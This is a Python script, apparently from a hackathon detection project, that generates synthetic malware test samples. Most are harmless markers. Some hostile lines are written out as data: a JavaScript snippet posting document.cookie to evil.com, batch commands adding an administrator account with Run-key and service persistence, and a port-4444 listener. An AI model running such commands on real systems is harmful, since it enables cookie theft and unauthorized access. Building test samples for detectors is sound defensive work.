"""
G√©n√©rateur d'√©chantillons de malwares synth√©tiques
RansomGuard AI - Hackathon Togo IT Days 2025
"""

import os
import base64
import zipfile
import random

def create_directory():
    """Cr√©er le r√©pertoire de tests"""
    os.makedirs('test_malware_samples', exist_ok=True)

def create_malicious_python():
    """Cr√©er un script Python malveillant"""
    content = '''#!/usr/bin/env python3
import subprocess
import base64
import os
import sys
import socket
import threading

# Malware Python synth√©tique
def malicious_function():
    # Code encod√© en base64
    encoded_payload = "ZWNobyAiaGVsbG8gd29ybGQi"
    decoded = base64.b64decode(encoded_payload)
    
    # Ex√©cution de commandes
    subprocess.call(decoded, shell=True)
    os.system("whoami")
    
    # √âvaluation dynamique
    eval("print('malware')")
    exec("print('trojan')")
    
    # Cr√©ation de socket suspect
    s = socket.socket()
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    
    # Import dynamique
    module = __import__('subprocess')
    module.call(['cmd', '/c', 'dir'])

if __name__ == "__main__":
    malicious_function()
'''
    
    with open('test_malware_samples/malicious_python.py', 'w') as f:
        f.write(content)

def create_malicious_batch():
    """Cr√©er un script batch malveillant"""
    content = '''@echo off
REM Malware batch synth√©tique

REM Cr√©ation d'utilisateur
net user hacker password /add
net localgroup administrators hacker /add

REM Modification du registre
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "malware" /t REG_SZ /d "C:\\malware.exe" /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "backdoor" /t REG_SZ /d "C:\\backdoor.exe" /f

REM T√¢ches planifi√©es
schtasks /create /tn "malware" /tr "C:\\malware.exe" /sc onstart /ru system
at 12:00 /every:m,t,w,th,f,sa,su malware.exe

REM Services
sc create "malware_service" binPath= "C:\\malware.exe"
sc start "malware_service"

REM Fichiers suspects
copy malware.exe C:\\Windows\\System32\\
copy backdoor.dll C:\\Windows\\System32\\

echo Malware installed successfully
pause
'''
    
    with open('test_malware_samples/malicious_batch.bat', 'w') as f:
        f.write(content)

def create_malicious_javascript():
    """Cr√©er un script JavaScript malveillant"""
    content = '''// Malware JavaScript synth√©tique

// √âvaluation dynamique
eval("console.log('malware')");
Function("alert('malware')")();
setTimeout(function() {
    eval("document.write('malware')");
}, 1000);

// Code encod√©
var encoded = "YWxlcnQoJ21hbHdhcmUnKQ==";
eval(atob(encoded));

// Fonctions suspectes
new Function("alert('trojan')")();
setInterval(function() {
    eval("document.cookie = 'malware=true'");
}, 5000);

// Requ√™tes r√©seau suspectes
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://evil.com/upload", true);
xhr.send(document.cookie);

// Manipulation DOM suspecte
document.body.innerHTML = "<script>alert('malware')</script>";
document.write("<script>eval('alert(\\'malware\\')')</script>");

// Variables suspectes
var malware_payload = "ZWNobyAiaGVsbG8i";
var decoded_payload = atob(malware_payload);
eval(decoded_payload);
'''
    
    with open('test_malware_samples/malicious_js.js', 'w') as f:
        f.write(content)

def create_malicious_dll():
    """Cr√©er une DLL malveillante simul√©e"""
    # Header PE simul√©
    pe_header = b'MZ' + b'\x90' * 58 + b'PE\x00\x00'
    
    # Section .text simul√©e
    text_section = b'\x90' * 1024  # NOP sled
    
    # Strings suspects
    suspicious_strings = [
        b'CreateProcess',
        b'VirtualAlloc',
        b'WriteProcessMemory',
        b'CreateRemoteThread',
        b'RegCreateKey',
        b'RegSetValue',
        b'InternetOpen',
        b'HttpOpenRequest',
        b'CryptEncrypt',
        b'malware',
        b'virus',
        b'trojan',
        b'backdoor'
    ]
    
    # Construire le fichier
    content = pe_header + text_section + b'\x00' * 512
    
    # Ajouter les strings suspects
    for string in suspicious_strings:
        content += string + b'\x00'
    
    with open('test_malware_samples/malicious_dll.dll', 'wb') as f:
        f.write(content)

def create_malicious_exe():
    """Cr√©er un ex√©cutable malveillant simul√©"""
    # Header PE simul√©
    pe_header = b'MZ' + b'\x90' * 58 + b'PE\x00\x00'
    
    # Section .text simul√©e
    text_section = b'\x90' * 2048  # NOP sled
    
    # Strings suspects
    suspicious_strings = [
        b'CreateProcess',
        b'ShellExecute',
        b'WinExec',
        b'VirtualAlloc',
        b'WriteProcessMemory',
        b'CreateRemoteThread',
        b'SetWindowsHookEx',
        b'RegCreateKey',
        b'RegSetValue',
        b'InternetOpen',
        b'HttpOpenRequest',
        b'CryptEncrypt',
        b'CryptDecrypt',
        b'malware.exe',
        b'virus.exe',
        b'trojan.exe',
        b'backdoor.exe'
    ]
    
    # Construire le fichier
    content = pe_header + text_section + b'\x00' * 1024
    
    # Ajouter les strings suspects
    for string in suspicious_strings:
        content += string + b'\x00'
    
    with open('test_malware_samples/malicious_exe.exe', 'wb') as f:
        f.write(content)

def create_obfuscated_python():
    """Cr√©er un script Python obfusqu√©"""
    content = '''#!/usr/bin/env python3
# Python obfusqu√©

# Variables avec noms suspects
malware_payload = "ZWNobyAiaGVsbG8gd29ybGQi"
decoded_payload = base64.b64decode(malware_payload)

# Code encod√© en hex
hex_code = "6576616c28227072696e7428276d616c7761726527292229"
hex_decoded = bytes.fromhex(hex_code).decode()

# √âvaluation dynamique
eval(hex_decoded)
exec(hex_decoded)

# Import dynamique
module_name = "subprocess"
module = __import__(module_name)
module.call(["cmd", "/c", "dir"])

# Variables avec noms tr√®s suspects
a = "malware"
b = "virus"
c = "trojan"
d = "backdoor"

# Code obfusqu√©
for i in range(10):
    if i % 2 == 0:
        eval("print('" + a + "')")
    else:
        exec("print('" + b + "')")

# Longue cha√Æne base64 suspecte
very_long_base64 = "ZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQiZWNobyAiaGVsbG8gd29ybGQi"
decoded_long = base64.b64decode(very_long_base64)
eval(decoded_long.decode())
'''
    
    with open('test_malware_samples/obfuscated_python.py', 'w') as f:
        f.write(content)

def create_packed_binary():
    """Cr√©er un binaire pack√© simul√©"""
    # Donn√©es avec entropie √©lev√©e (simulation de packing)
    packed_data = bytes(random.randint(0, 255) for _ in range(8192))
    
    # Header PE simul√©
    pe_header = b'MZ' + b'\x90' * 58 + b'PE\x00\x00'
    
    # Combiner header + donn√©es pack√©es
    content = pe_header + packed_data
    
    with open('test_malware_samples/packed_binary.bin', 'wb') as f:
        f.write(content)

def main():
    """Cr√©er tous les √©chantillons de malwares"""
    print("üîß Cr√©ation des √©chantillons de malwares synth√©tiques...")
    
    create_directory()
    
    # Scripts malveillants
    create_malicious_python()
    create_malicious_batch()
    create_malicious_javascript()
    
    # Binaires malveillants
    create_malicious_dll()
    create_malicious_exe()
    
    # Fichiers obfusqu√©s
    create_obfuscated_python()
    create_packed_binary()
    
    print("‚úÖ √âchantillons de malwares cr√©√©s dans test_malware_samples/")
    print("üìÅ Fichiers cr√©√©s:")
    
    files = [
        "malicious_python.py",
        "malicious_batch.bat", 
        "malicious_js.js",
        "malicious_dll.dll",
        "malicious_exe.exe",
        "obfuscated_python.py",
        "packed_binary.bin"
    ]
    
    for file in files:
        print(f"  ‚Ä¢ {file}")

if __name__ == "__main__":
    main()
